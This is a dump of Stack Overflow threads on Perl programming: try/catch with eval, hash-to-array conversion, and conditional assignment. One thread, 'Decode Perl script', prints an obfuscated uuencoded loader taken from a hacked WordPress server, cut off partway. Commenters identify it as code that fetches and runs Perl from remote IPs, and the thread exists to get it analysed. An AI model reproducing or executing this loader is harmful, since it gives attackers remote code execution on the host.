"title": "Perl - messing try/catch with eval", "body": "<p>How to catch exception from inner eval {}?</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nuse Try::Tiny;\nuse Exception::Class ('T');\n\nuse Data::Dumper;\n\ntry {\n    eval {\n        T-&gt;throw(\"Oops\");\n    };\n    } catch {\n        print Dumper \\$_;\n    };\n}\n</code></pre>\n\n<p>We have got not Exception::Class submodule, but scalar instead. More precisely, I have a lot of legacy code with <em>require</em>, and require seems to use <em>eval</em> inside.</p>\n"}, {"tags": ["arrays", "perl", "hash"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532946358, "post_id": 51590999, "comment_id": 90149006, "body": "You can&#39;t just change a hash to an array without some more design work. Hashes use strings as keys whereas array indexes are integers. Whatever <code>$server</code> contains needs to be converted to an array index, and you will no longer have that string in the <code>$self</code> structure."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532951129, "post_id": 51592519, "comment_id": 90151983, "body": "See also this guy&#39;s previous question <a href=\"https://stackoverflow.com/questions/51580447/converting-code-using-hash-to-array\"><i>Converting code using hash to array</i></a>"}, {"owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 0, "creation_date": 1532952033, "post_id": 51592519, "comment_id": 90152535, "body": "Always assign a value to your variables. Years ago, <code>mod_perl</code> use to reuse the data space without reinitializing it. Variables that were not assigned a value when declared, would use the value from the previous run.  This problem was fixed but who knows when a new idea comes along that will do the same thing. Get into the habit of programming defensively: always assign a value to your variables."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 1, "creation_date": 1532952684, "post_id": 51592519, "comment_id": 90152938, "body": "@shawnhcorey: It&#39;s been a long time and I&#39;ve successfully forgotten most of what I knew about <code>mod_perl</code>, but didn&#39;t it only reuse package variables? It sees your program as a subroutine, so any lexical variables will be initialised correctly."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532957331, "post_id": 51592519, "comment_id": 90155915, "body": "<i>&quot;Always assign a value to your variables&quot;</i> Nonsense. Defensive programming is reasonable, but this is just one example out of endless <i>&quot;new ideas&quot;</i> that you have solved by making your code unnecessarily more noisy. If you&#39;re using a <i>new thing</i> then you should get to know what problems it may bring with it. God forbid that every Perl program contains every hack to defend against every possible misbehaviour of its environment. In any case, this is clearly not a <code>mod_perl</code> program."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532957508, "post_id": 51592519, "comment_id": 90156054, "body": "@Dave: <i>&quot;didn&#39;t it only reuse package variables&quot;</i> I think that&#39;s very likely. Just saving and reloading the memory image is very unlikely to restore lexical data on the stack frame because it is <i>mobile</i>, and I think Apache are cleverer than that. Restoring package variables seems like a good idea as long as you know it&#39;s happening."}, {"owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532966838, "post_id": 51592519, "comment_id": 90162084, "body": "@Borodin Apache wasn&#39;t but now it is. And this is not a &quot;new&quot; idea. It&#39;s more than 50 years old. And when it comes to programmers, out of sight is out of mind. Make everything explicit. &quot;Noisy&quot; is better than vague."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 1, "creation_date": 1532972756, "post_id": 51592519, "comment_id": 90165152, "body": "@shawn: So you are saying that Apache&#39;s <i>&quot;thing&quot;</i> is old and fixed, but we should code for it anyway, along with any <i>&quot;new things&quot;</i> that come along with the same bug, and which may be imposed on our program without us knowing? That&#39;s even worse. Stick to C."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 1, "creation_date": 1532973472, "post_id": 51592519, "comment_id": 90165535, "body": "@shawn: Do you also initialise all scalar variables to zero <code>0</code> or the empty string <code>&quot;&quot;</code>? Now there&#39;s a puzzle: which should it be? And the world would end if <code>mod_perl</code> or something just as nasty set it to <code>undef</code>. What shall we do?"}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 3, "last_activity_date": 1532948529, "creation_date": 1532948529, "answer_id": 51592519, "question_id": 51590999, "link": "https://stackoverflow.com/questions/51590999/converting-a-hash-to-an-array-in-perl/51592519#51592519", "title": "Converting a hash to an array in perl", "body": "<p>Firstly, these two assignments are unnecessary:</p>\n\n<pre><code>my @subscriptions    = ();\n$self-&gt;{'serverMap'} = {};\n</code></pre>\n\n<p>The first does nothing and the second does nothing useful. When you declare an array with</p>\n\n<pre><code>my @subscriptions;\n</code></pre>\n\n<p>then it is created empty. Adding <code>= ()</code> to the definition achieves nothing.</p>\n\n<p>And explicitly setting <code>$self-&gt;{'serverMap'}</code> to be an empty, anonymous hash isn't useful. When you start putting data into <code>$self-&gt;{'serverMap'}</code> you can decide what format that data should be in.</p>\n\n<p>Secondly, you say that you want to replace a hash with an array. I assume that it's the hash that's currently stored in <code>$self-&gt;{'serverMap'}</code> that you want to replace. That's easy. Simply replace the line:</p>\n\n<pre><code>$self-&gt;{'serverMap'}-&gt;{$server} = $serverId;\n</code></pre>\n\n<p>with</p>\n\n<pre><code>push @{ $self-&gt;{'serverMap'}-&gt;{$server} }, $serverId;\n</code></pre>\n\n<p>In fact, let's get rid of all that unnecessary punctuation at the same time:</p>\n\n<pre><code>push @{ $self-&gt;{serverMap}{$server} }, $serverId;\n</code></pre>\n\n<p>And that's done. Originally, <code>$self-&gt;{'serverMap'}</code> contained a reference to a hash, now it contains a reference to an array.</p>\n\n<p>Of course, that's only half the job. You now store the data as an array, but you also need to access the data as an array. Somewhere in your code, you'll be looking at the data in <code>$self-&gt;{'serverMap'}</code> - and now that needs to be changed too, otherwise your program will stop working.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 10151166, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-YJLXZg2Tft8/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7p_TN-8YXCNasAAvYbaKufp0cySrA/mo/photo.jpg?sz=128", "display_name": "nexusproject", "link": "https://stackoverflow.com/users/10151166/nexusproject"}, "is_accepted": false, "score": 0, "last_activity_date": 1533034392, "creation_date": 1533034392, "answer_id": 51611688, "question_id": 51590999, "link": "https://stackoverflow.com/questions/51590999/converting-a-hash-to-an-array-in-perl/51611688#51611688", "title": "Converting a hash to an array in perl", "body": "<p>same but looks shorter</p>\n\n<pre><code>my @subscriptions;\nforeach my $service( \"pmservice\", \"saservice\" ) {\n    $self-&gt;{serverMap} = enmGetServiceGroupInstances($self-&gt;{'site'}, $self-&gt;{'date'}, $service);\n\n    push @subscriptions, map {\n        +{ server =&gt; $_, prog =&gt; 'JBOSS' }\n    } keys %{ $self-&gt;{'serverMap'} };\n}\n</code></pre>\n"}], "owner": {"reputation": 129, "user_id": 3414559, "user_type": "registered", "accept_rate": 12, "profile_image": "https://graph.facebook.com/1480602384/picture?type=large", "display_name": "Ray", "link": "https://stackoverflow.com/users/3414559/ray"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1533034392, "creation_date": 1532943315, "last_edit_date": 1532946110, "question_id": 51590999, "link": "https://stackoverflow.com/questions/51590999/converting-a-hash-to-an-array-in-perl", "title": "Converting a hash to an array in perl", "body": "<p>I want to change this code from using a hash to an array, but I cannot find a good example to go on. Can anyone advise? My only inkling so far is to use <code>[ ]</code> in line 2.</p>\n\n<pre><code>my @subscriptions    = ();\n$self-&gt;{'serverMap'} = {};\n\nforeach my $service( \"pmservice\", \"saservice\" ) {\n\n    my $r_serverMap = enmGetServiceGroupInstances($self-&gt;{'site'}, $self-&gt;{'date'}, $service);\n\n    while ( my ($server, $serverId) = each %{$r_serverMap} ) {\n        push ( @subscriptions, {'server' =&gt; $server, 'prog' =&gt; 'JBOSS'} );\n        $self-&gt;{'serverMap'}-&gt;{$server} = $serverId;\n    }\n}\n\nreturn \\@subscriptions;\n</code></pre>\n"}, {"tags": ["perl", "if-statement"], "answers": [{"tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": false, "score": 4, "last_activity_date": 1532943244, "creation_date": 1532943244, "answer_id": 51590970, "question_id": 51590856, "link": "https://stackoverflow.com/questions/51590856/perl-return-if-statement-variable/51590970#51590970", "title": "Perl return if statement variable", "body": "<p>Two ways to do that are to use the ternary operator <a href=\"http://perldoc.perl.org/perlop.html#Conditional-Operator\" rel=\"nofollow noreferrer\"><code>?:</code></a>, or move the assignment into the body of the <code>if</code>:</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $variable1 = \"10.12.1.1\";\nmy $variable2 = \"10.12.1.2\";\n\nmy $string = \"x\";\n\nmy $serveris =\n    $string =~ m/^[abcdefghijklm]/\n    ? $variable1 : $variable2;\n# -- OR --\nmy $serveris;\nif ($string =~ m/^[abcdefghijklm]/) {\n    $serveris = $variable1;\n} else {\n    $serveris = $variable2;\n}\n\nprint \" $serveris \\n\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1485, "user_id": 938394, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/m5Ovb.jpg?s=128&g=1", "display_name": "Paul Varghese", "link": "https://stackoverflow.com/users/938394/paul-varghese"}, "is_accepted": false, "score": 3, "last_activity_date": 1532952061, "creation_date": 1532952061, "answer_id": 51593528, "question_id": 51590856, "link": "https://stackoverflow.com/questions/51590856/perl-return-if-statement-variable/51593528#51593528", "title": "Perl return if statement variable", "body": "<p>You can make use of lambda functions.</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse warnings;\nuse strict;\n\nmy $variable1 = \"10.12.1.1\";\nmy $variable2 = \"10.12.1.2\";\n\nmy $string = $ARGV[0];\n\nmy $serveris = sub {\n    my ( $string ) = @_;\n    if ($string =~ m/^[abcdefghijklm]/) {\n            return \" $variable1 \\n\"\n    } else {\n            return \" $variable2 \\n\"\n    }\n\n};\n\nprint $serveris-&gt;($string)\n</code></pre>\n\n<p>References: <a href=\"https://stackoverflow.com/questions/7343526/how-to-run-an-anonymous-function-in-perl\">How to run an anonymous function in Perl?</a></p>\n"}, {"tags": [], "owner": {"reputation": 2000, "user_id": 1275160, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/0e59227edde0173c28ade664aac101ec?s=128&d=identicon&r=PG", "display_name": "Diab Jerius", "link": "https://stackoverflow.com/users/1275160/diab-jerius"}, "is_accepted": false, "score": 0, "last_activity_date": 1533566949, "creation_date": 1533566949, "answer_id": 51710332, "question_id": 51590856, "link": "https://stackoverflow.com/questions/51590856/perl-return-if-statement-variable/51710332#51710332", "title": "Perl return if statement variable", "body": "<p>The simplest option for your example code is to use the ternary operator:</p>\n\n<pre><code>my $serveris = $string =~ m/^[abcdefghijklm]/\n             ? $variable1\n             : $variable2;\n</code></pre>\n\n<p>However, if things are more complicated, nested ternary operators can cause some confusion.  To maintain the structure of your <code>if/else</code> statements, use a <code>do</code> block.  <code>do</code> returns the result of the last statement evaluated in the block as its value.</p>\n\n<pre><code>my $serveris = do {\n    if ($string =~ m/^[abcdefghijklm]/) {\n        $variable1;\n    } else {\n        $variable2;\n    }\n};\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10134928, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Xlv9SoGmHAc/AAAAAAAAAAI/AAAAAAAAECY/5X9Uu_FL6G0/photo.jpg?sz=128", "display_name": "Grzegorz", "link": "https://stackoverflow.com/users/10134928/grzegorz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 726, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1533566949, "creation_date": 1532942899, "last_edit_date": 1532947903, "question_id": 51590856, "link": "https://stackoverflow.com/questions/51590856/perl-return-if-statement-variable", "title": "Perl return if statement variable", "body": "<p>How can i do something like that:\nI want return IP server from if statment, where i sign if to variable. It is possible? </p>\n\n<pre><code>#!/usr/bin/env perl\n#\n\nuse warnings;\nuse strict;\n\nmy $variable1 = \"10.12.1.1\";\nmy $variable2 = \"10.12.1.2\";\n\nmy $string = $ARGV[0];\n\nmy $serveris=&gt;(if ($string =~ m/^[abcdefghijklm]/) {\n            print \" $variable1 \\n\"\n} else {\n            print \" $variable2 \\n\"\n})\n\n\nprint $serveris\n</code></pre>\n"}, {"tags": ["linux", "wordpress", "perl", "security"], "comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 6, "creation_date": 1532943391, "post_id": 51590854, "comment_id": 90147175, "body": "Replace the <code>eval</code> with <code>print</code> to see the Perl code that would get run. At first glance it seems to be some kind of bootstrapping script that&#39;s fetching code to run from a remote server. Get rid of it immediately!"}], "answers": [{"tags": [], "owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "is_accepted": false, "score": 1, "last_activity_date": 1532951999, "creation_date": 1532951999, "answer_id": 51593516, "question_id": 51590854, "link": "https://stackoverflow.com/questions/51590854/decode-perl-script/51593516#51593516", "title": "Decode Perl script", "body": "<p>This stuff looks dangerous, it's downloading more Perl code from either of 5.135.42.98:25 or 198.245.49.106 and executing that code; as haukex says, get rid of it</p>\n"}], "owner": {"reputation": 2156, "user_id": 783875, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/9acaad1caae4afa2f4a0cd22e966d10f?s=128&d=identicon&r=PG", "display_name": "WebNovice", "link": "https://stackoverflow.com/users/783875/webnovice"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 545, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1532951999, "creation_date": 1532942892, "question_id": 51590854, "link": "https://stackoverflow.com/questions/51590854/decode-perl-script", "title": "Decode Perl script", "body": "<p>Can anyone guide me on how to decode the below perl script. Its a script uploaded to the server through a hacked WordPress site. It's being run continuously through a cron job, and I suspect its an cryto mining script.</p>\n\n<pre><code>my $INrVhi;$INrVhi.=$_ while(&lt;DATA&gt;);eval(unpack('u*',$INrVhi));\n__DATA__\nM(R$O=7-R+V)I;B]P97)L(\"UW\"G5S92!S=')I8W0[\"G5S92!03U-)6#L*=7-E\nM($E/.CI3;V-K970[\"G5S92!)3SHZ4V5L96-T.PHD,\"`](\")X:6YE=&amp;0B.R!M\nM&gt;2`H)'$Q+\"`D&lt;3(I(#T@*\"(P+C&lt;B+\"`B,\"XX(BD[(\"1\\(#T@,3L@)FUA:6XH\nM*3L*&lt;W5B(&amp;UA:6X*&gt;PIE&gt;&amp;ET(#`@=6YL97-S(&amp;1E9FEN960@*&amp;UY(\"1P:60@\nM/2!F;W)K*3L*97AI=\"`P(&amp;EF(\"1P:60[\"E!/4TE8.CIS971S:60H*3L*)%-)\nM1WLD7WT@/2`B24=.3U)%(B!F;W(@*'%W(\"A(55`@24Y4($E,3\"!&amp;4$4@455)\nM5\"!!0E)4(%534C$@4T5'5B!54U(R(%!)4$4@04Q232!415)-($-(3$0I*3L*\nM=6UA&lt;VL@,#L*8VAD:7(@(B\\B.PIO&lt;&amp;5N(\"A35$1)3BP@(CPO9&amp;5V+VYU;&amp;PB\nM*3L*;W!E;B`H4U1$3U54+\"`B/B]D978O;G5L;\"(I.PIO&lt;&amp;5N(\"A35$1%4E(L\nM(\"(^)E-41$]55\"(I.PIM&gt;2`D=7)L(#T@6R(U+C$S-2XT,BXY.#HR-2(L(C$Y\nM.\"XR-#4N-#DN,3`V(ET[\"FUY(\"1R;F0@/2!;(F$B+BXB&gt;B(L(\")!(BXN(EHB\nM73L@)')N9\"`](&amp;IO:6X@*\"(B+\"!`)')N9%MM87`@&gt;W)A;F0@0\"1R;F1]*#$N\nM+B@V(\"L@:6YT(')A;F0@-2DI72D[\"FUY(\"1D:7(@/2`B+W9A&lt;B]T;7`B.R!I\nM9B`H;W!E;B`H1BP@(CXB+\"`B+W1M&lt;\"\\D&lt;FYD(BDI('L@8VQO&lt;V4@1CL@=6YL\nM:6YK(\"(O=&amp;UP+R1R;F0B.R`D9&amp;ER(#TB+W1M&lt;\"([('T*;7D@*\"1H96%D97(L\nM(\"1C;VYT96YT*3L*;7D@*\"1L:6YK+\"`D9FEL92P@)&amp;ED+\"`D8V]M;6%N9\"P@\nM)'1I;65O=70I(#T@*\")E;BYW:6MI&lt;&amp;5D:6$N;W)G(BP@(FEN9&amp;5X+FAT;6PB\nM+\"`Q+\"`Y-BP@,3`I.PIF;W)E86-H(&amp;UY(\"1R&lt;R`H0\"1U&lt;FPI\"GL*)&amp;AE861E\nM&lt;B`](\"(D9&amp;ER+R(@+B!T:6UE.R`D8V]N=&amp;5N=\"`](\"1H96%D97(@+B`B,2([\nM\"G5N;&amp;EN:R`D:&amp;5A9&amp;5R(&amp;EF(\"UF(\"1H96%D97([('5N;&amp;EN:R`D8V]N=&amp;5N\nM=\"!I9B`M9B`D8V]N=&amp;5N=#L*)FAT='`H)')S+\"`D=&amp;EM96]U=\"P@)&amp;AE861E\nM&lt;BP@)&amp;-O;G1E;G0L(#`I.PII9B`H;W!E;B`H1BP@(CPB+\"`D:&amp;5A9&amp;5R*2D*\nM&gt;PIF;&amp;]C:R!&amp;+\"`Q.PIM&gt;2`H)'1E&lt;W0L(\"1T87-K*2`](\"@P+\"`B(BD[\"G=H\nM:6QE(\"@\\1CXI\"GL*&lt;R]&gt;7',J*%M&gt;7'-=/RXJ*20O)#$O.PIS+UXH+BI;7EQS\nM72E&lt;&lt;RHD+R0Q+SL*;F5X=\"!U;FQE&lt;W,@;&amp;5N9W1H(\"1?.PHD=&amp;5S=\"`K*R!I\nM9B`D7R!E&lt;2`B2%144\"\\Q+C`@,C`P($]+(B!\\?\"`D7R!E&lt;2`B0V]N;F5C=&amp;EO\nM;CH@8VQO&lt;V4B.R`D=&amp;%S:R`](\"0Q(&amp;EF(\"]&gt;4V5T+4-O;VMI93H@4$A04T53\nM4TE$/2A;7CM=*RDO.PI]\"F-L;W-E($8[\"B@D;&amp;EN:RP@)&amp;9I;&amp;4L(\"1I9\"P@\nM)&amp;-O;6UA;F0L(\"1T:6UE;W5T*2`](\"9D96-X9\"@D=&amp;%S:RD@:68@)'1E&lt;W0@\nM/3T@,B`F)B!L96YG=&amp;@@)'1A&lt;VL[\"GT*=6YL:6YK(\"1H96%D97(@:68@+68@\nM)&amp;AE861E&lt;CL@=6YL:6YK(\"1C;VYT96YT(&amp;EF(\"UF(\"1C;VYT96YT.PI]\"F5X\nM:70@,\"!I9B`A9&amp;5F:6YE9\"`D8V]M;6%N9\"!\\?\"`D8V]M;6%N9\"`A?B`O7C$V\nM)\"\\[\"B1H96%D97(@/2`B)&amp;1I&lt;B\\B(\"X@=&amp;EM93L@)&amp;-O;G1E;G0@/2`B)&amp;1I\nM&lt;B\\D9FEL92([\"G5N;&amp;EN:R`D:&amp;5A9&amp;5R(&amp;EF(\"UF(\"1H96%D97([('5N;&amp;EN\nM:R`D8V]N=&amp;5N=\"!I9B`M9B`D8V]N=&amp;5N=#L*)FAT='`H)&amp;QI;FLL(\"1T:6UE\nM;W5T+\"`D:&amp;5A9&amp;5R+\"`D8V]N=&amp;5N=\"P@,2D[\"FUY(\"@D&lt;F5S&lt;\"P@)'-I&gt;F4I\nM(#T@*\"(P,#`B+\"`P*3L*:68@*&amp;]P96X@*$8L(\"(\\(BP@)&amp;AE861E&lt;BDI\"GL*\nM9FQO8VL@1BP@,3L*=VAI;&amp;4@*#Q&amp;/BD*&gt;PIS+UY&lt;&lt;RHH6UY&lt;&lt;UT_+BHI)\"\\D\nM,2\\[\"G,O7B@N*EM&gt;7'-=*5QS*B0O)#$O.PIN97AT('5N;&amp;5S&lt;R!L96YG=&amp;@@\nM)%\\[\"B1R97-P(#T@)#$@:68@+UY(5%107%,K7',K*%QD7&amp;1&lt;9\"DO.PI]\"F-L\nM;W-E($8[\"GT*)'-I&gt;F4@/2`H&lt;W1A=\"`D8V]N=&amp;5N=\"E;-UT@:68@+68@)&amp;-O\nM;G1E;G0[\"B1S:7IE(#T@,\"!I9B`A9&amp;5F:6YE9\"`D&lt;VEZ92!\\?\"`D&lt;VEZ92`A\nM?B`O7EQD*R0O.PII9B`H)'-I&gt;F4@/B`P*0I[\"F-H;6]D(#`W-34L(\"1C;VYT\nM96YT.PIS&gt;7-T96T@(G!E&lt;FP@)&amp;-O;G1E;G0@/B]D978O;G5L;\"`R/B8Q(CL*\nM?0IU;FQI;FL@)&amp;AE861E&lt;B!I9B`M9B`D:&amp;5A9&amp;5R.R!U;FQI;FL@)&amp;-O;G1E\nM;G0@:68@+68@)&amp;-O;G1E;G0[\"F9O&lt;F5A8V@@;7D@)')S(\"A`)'5R;\"D*&gt;PHD\nM:&amp;5A9&amp;5R(#T@(B]D978O;G5L;\"([(\"1C;VYT96YT(#T@)&amp;AE861E&lt;CL*)FAT\nM='`H)')S+\"`Q,\"P@)&amp;AE861E&lt;BP@)&amp;-O;G1E;G0L(#`L(\"(D:60N)')E&lt;W`N\nM)'-I&gt;F4B*3L*?0IE&gt;&amp;ET(#`[\"GT*&lt;W5B('AO&lt;FP*&gt;PIM&gt;2`H)&amp;QI;F4L(\"1C\nM;V1E+\"`D&gt;&amp;]R+\"`D;&amp;EM*2`](\"AS:&amp;EF=\"P@(B(L(#$L(#$V*3L*9F]R96%C\nM:\"!M&gt;2`D8VAR(\"AS&lt;&amp;QI=\"`H+R\\L(\"1L:6YE*2D*&gt;PII9B`H)'AO&lt;B`]/2`D\nM;&amp;EM*0I[\"B1L:6T@/2`P(&amp;EF(\"1L:6T@/3T@,C4V.PHD;&amp;EM(\"L](#$V.PHD\nM&gt;&amp;]R(#T@,3L*?0HD8V]D92`N/2!P86-K(\"@B0R(L('5N&lt;&amp;%C:R`H(D,B+\"`D\nM8VAR*2!&gt;(\"1X;W(I.PHD&gt;&amp;]R(\"LK.PI]\"G)E='5R;B`D8V]D93L*?0IS=6(@\nM9&amp;5C&gt;&amp;0*&gt;PIM&gt;2`D9&amp;%T82`]('!A8VL@*\")(*B(L('-H:69T*3L*0%\\@/2!U\nM;G!A8VL@*\")#-2(L('-U8G-T&lt;B`H)&amp;1A=&amp;$L(#`L(#4L(\"(B*2D[\"G)E='5R\nM;B`H)GAO&lt;FPH&lt;W5B&lt;W1R(\"@D9&amp;%T82P@,\"P@&lt;VAI9G0L(\"(B*2DL(\"9X;W)L\nM*'-U8G-T&lt;B`H)&amp;1A=&amp;$L(#`L('-H:69T+\"`B(BDI+\"!`7RD[\"GT*&lt;W5B(&amp;AT\nM='`*&gt;PIM&gt;2`H)'5R;\"P@)'1I;65O=70L(\"1H96%D97(L(\"1C;VYT96YT+\"`D\nM;6]D92P@)&amp;=E8VMO*2`]($!?.PHD9V5C:V\\@/2`B,C`Q,#`Q,#$B(&amp;EF(\"%D\nM969I;F5D(\"1G96-K;R!\\?\"`A;&amp;5N9W1H(\"1G96-K;SL*;7D@*\"1H;W-T+\"`D\nM&lt;&amp;]R=\"P@)'!A=&amp;@I(#T@)'5R;\"`]?B`O7BA;7EPO.ETK*3HJ*%QD*BD_*%PO\nM/UM&gt;7\"-=*BDO.PIR971U&lt;FX@=6YL97-S(\"1H;W-T.PIM&gt;2`D861D&lt;B`](&amp;=E\nM=&amp;AO&lt;W1B&gt;6YA;64@)&amp;AO&lt;W0[\"G)E='5R;B!U;FQE&lt;W,@)&amp;%D9'([\"B1P;W)T\nM('Q\\/2`X,#L*)'!A=&amp;@@?'P](\"(O(CL*)&amp;%D9'(@/2!S;V-K861D&lt;E]I;B@D\nM&lt;&amp;]R=\"P@)&amp;%D9'(I.PIM&gt;2`D&lt;F5A9&amp;5R&lt;R`]($E/.CI396QE8W0M/FYE=R@I\nM(&amp;]R(')E='5R;CL*;7D@)'=R:71E&lt;G,@/2!)3SHZ4V5L96-T+3YN97&lt;H*2!O\nM&lt;B!R971U&lt;FX[\"FUY(\"1B=69F97(@/2!J;VEN\"B@*(EQX,$1&lt;&gt;#!!(BP*(D=%\nM5\"`D&lt;&amp;%T:\"!(5%10+S$N,2(L\"B)(;W-T.B`D:&amp;]S=\"(L\"B)5&lt;V5R+4%G96YT\nM.B!-;WII;&amp;QA+S4N,\"`H5VEN9&amp;]W&lt;R!.5\"`V+C$[(%=I;C8T.R!X-C0[(')V\nM.C8P+C`I($=E8VMO+R1G96-K;R!&amp;:7)E9F]X+S8P+C`B+`HB06-C97!T.B!T\nM97AT+VAT;6PL87!P;&amp;EC871I;VXO&gt;&amp;AT;6PK&gt;&amp;UL+&amp;%P&lt;&amp;QI8V%T:6]N+WAM\nM;#MQ/21Q,2PJ+RH[&lt;3TD&lt;3(B+`HB06-C97!T+4QA;F=U86=E.B!E;BUU&lt;RQE\nM;CMQ/21Q,2(L\"B)!8V-E&lt;'0M16YC;V1I;F&lt;Z(&amp;=Z:7`L(&amp;1E9FQA=&amp;4B+`HB\nM06-C97!T+4-H87)S970Z($E33RTX.#4Y+3$L=71F+3@[&lt;3TD&lt;3(L*CMQ/21Q\nM,2(L\"B)#;VYN96-T:6]N.B!C;&amp;]S92(L\"B)&lt;&gt;#!$7'@P02(**3L*:68@*\"1M\nM;V1E*0I[\"B1B=69F97(@/2!J;VEN\"B@*(EQX,$1&lt;&gt;#!!(BP*(D=%5\"`D&lt;&amp;%T\nM:\"!(5%10+S$N,\"(L\"B)(;W-T.B`D:&amp;]S=\"(L\"B)5&lt;V5R+4%G96YT.B!-;WII\nM;&amp;QA+S4N,\"`H5VEN9&amp;]W&lt;R!.5\"`V+C$[(%=I;C8T.R!X-C0[(')V.C8Q+C`I\nM($=E8VMO+R1G96-K;R!&amp;:7)E9F]X+S8Q+C`B+`HB06-C97!T.B!T97AT+VAT\nM;6PL*B\\J(BP*(D-O;FYE8W1I;VXZ(&amp;-L;W-E(BP*(